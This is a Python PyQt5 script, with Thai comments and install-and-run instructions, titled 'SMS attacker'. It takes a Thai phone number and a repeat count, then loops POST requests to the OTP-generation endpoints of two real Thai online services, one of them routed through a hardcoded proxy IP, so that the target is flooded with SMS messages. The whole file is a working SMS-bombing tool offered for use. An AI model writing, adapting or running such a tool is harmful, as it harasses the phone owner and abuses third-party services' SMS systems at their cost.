# -*- coding: utf-8 -*-

# scriptถูกเขียนขึ้นโดนStellarStellar
# วิธีใช้งาน
# pip install requests
# pip install pyqt5-tools
# python SMS.py
import requests
from PyQt5 import QtCore, QtGui, QtWidgets

while True:
 class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(800, 600)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("../Image/46be5318d48ae486c73edb32405f1149.jpg"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        MainWindow.setWindowIcon(icon)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(360, 350, 91, 31))
        self.pushButton.setStyleSheet("background-color: rgb(255, 255, 255);\n"
"gridline-color: rgb(255, 255, 255);")
        self.pushButton.setIconSize(QtCore.QSize(30, 30))
        self.pushButton.setObjectName("pushButton")
        self.pushButton.clicked.connect(self.press)
        self.textEdit = QtWidgets.QTextEdit(self.centralwidget)
        self.textEdit.setGeometry(QtCore.QRect(300, 240, 291, 31))
        self.textEdit.setObjectName("textEdit")
        self.textEdit_2 = QtWidgets.QTextEdit(self.centralwidget)
        self.textEdit_2.setGeometry(QtCore.QRect(300, 170, 291, 31))
        self.textEdit_2.setObjectName("textEdit_2")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(160, 180, 120, 16))
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(160, 250, 55, 16))
        self.label_2.setObjectName("label_2")
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 800, 26))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "SMS attacker by StellarStellar(lukmai1123th)"))
        self.pushButton.setText(_translate("MainWindow", "OK"))
        self.label.setText(_translate("MainWindow", "Phone number(+66)"))
        self.label_2.setText(_translate("MainWindow", "์์Times"))

    def press(self):
        phonenumber=self.textEdit_2.toPlainText()
        number=self.textEdit.toPlainText()
        def attack():
            requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phonenumber},
                          proxies={"http": "http://182.52.103.144:8080"})
            requests.post("https://api.1112delivery.com/api/v1/otp/create",
                          data={"phonenumber": "" + phonenumber + "", "language": "th"}, headers={})
        for i in range(int(number)):
            attack()
            

 if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())


